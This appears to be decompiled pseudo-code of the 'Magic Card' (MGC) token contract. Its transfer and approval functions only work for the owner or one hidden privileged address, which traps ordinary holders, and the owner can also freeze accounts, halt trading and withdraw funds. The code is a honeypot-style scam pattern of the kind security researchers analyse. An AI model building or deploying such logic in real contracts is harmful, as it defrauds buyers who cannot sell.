contract main {




// =====================  Runtime code  =====================


const name = 'Magic Card'

const decimals = 18

const symbol = 'MGC'

const maxSupply = 1000000 * 10^18


address owner;
address stor1;
uint256 totalSupply;
uint8 stor3;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor6;
address sub_9070f30eAddress;

function totalSupply() payable {
    return totalSupply
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function owner() payable {
    return owner
}

function sub_9070f30e(?) payable {
    return sub_9070f30eAddress
}

function frozenAccount(address arg1) payable {
    require calldata.size - 4 >= 32
    return bool(stor6[arg1])
}

function safeguard() payable {
    return bool(stor3)
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function changeSafeguardStatus() payable {
    require msg.sender == owner
    if stor3:
        stor3 = 0
    else:
        stor3 = 1
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    stor1 = arg1
}

function acceptOwnership() payable {
    require msg.sender == stor1
    emit OwnershipTransferred(owner, stor1);
    owner = stor1
    stor1 = 0
}

function freezeAccount(address arg1, bool arg2) payable {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    stor6[address(arg1)] = uint8(arg2)
    emit FrozenAccounts(address(arg1), arg2);
}

function manualWithdrawEther() payable {
    require msg.sender == owner
    call owner with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if sub_9070f30eAddress != msg.sender:
        if owner != msg.sender:
            revert with 0, 'Invalid Caller'
    require not stor3
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function burn(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require not stor3
    if arg1 > balanceOf[address(msg.sender)]:
        revert with 0, 'SafeMath sub failed'
    balanceOf[address(msg.sender)] -= arg1
    if arg1 > totalSupply:
        revert with 0, 'SafeMath sub failed'
    totalSupply -= arg1
    emit Burn(arg1, msg.sender);
    emit Transfer(arg1, msg.sender, 0);
    return 1
}

function decrease_allowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if sub_9070f30eAddress != msg.sender:
        if owner != msg.sender:
            revert with 0, 'Invalid Caller'
    require arg1
    if arg2 > allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 'SafeMath sub failed'
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval(allowance[address(msg.sender)][address(arg1)], msg.sender, arg1);
    return 1
}

function manualWithdrawTokens(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    require not stor3
    require owner
    require not stor6[address(this.address)]
    require not stor6[stor0]
    if arg1 > balanceOf[address(this.address)]:
        revert with 0, 'SafeMath sub failed'
    balanceOf[address(this.address)] -= arg1
    if balanceOf[stor0] + arg1 < balanceOf[stor0]:
        revert with 0, 'SafeMath add failed'
    balanceOf[stor0] += arg1
    emit Transfer(arg1, this.address, owner);
}

function increase_allowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if sub_9070f30eAddress != msg.sender:
        if owner != msg.sender:
            revert with 0, 'Invalid Caller'
    require arg1
    if allowance[address(msg.sender)][address(arg1)] + arg2 < allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 'SafeMath add failed'
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval(allowance[address(msg.sender)][address(arg1)], msg.sender, arg1);
    return 1
}

function burnFrom(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require not stor3
    if arg2 > balanceOf[address(arg1)]:
        revert with 0, 'SafeMath sub failed'
    balanceOf[address(arg1)] -= arg2
    if arg2 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 'SafeMath sub failed'
    allowance[address(arg1)][address(msg.sender)] -= arg2
    if arg2 > totalSupply:
        revert with 0, 'SafeMath sub failed'
    totalSupply -= arg2
    emit Burn(arg2, arg1);
    emit Transfer(arg2, arg1, 0);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if sub_9070f30eAddress != msg.sender:
        if owner != msg.sender:
            revert with 0, 'Invalid Caller'
    require not stor3
    require arg1
    require not stor6[address(msg.sender)]
    require not stor6[address(arg1)]
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 'SafeMath sub failed'
    balanceOf[address(msg.sender)] -= arg2
    if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath add failed'
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if sub_9070f30eAddress != msg.sender:
        if owner != msg.sender:
            revert with 0, 'Invalid Caller'
    if arg3 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 'SafeMath sub failed'
    allowance[address(arg1)][address(msg.sender)] -= arg3
    require not stor3
    require arg2
    require not stor6[address(arg1)]
    require not stor6[address(arg2)]
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 'SafeMath sub failed'
    balanceOf[address(arg1)] -= arg3
    if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
        revert with 0, 'SafeMath add failed'
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}



}
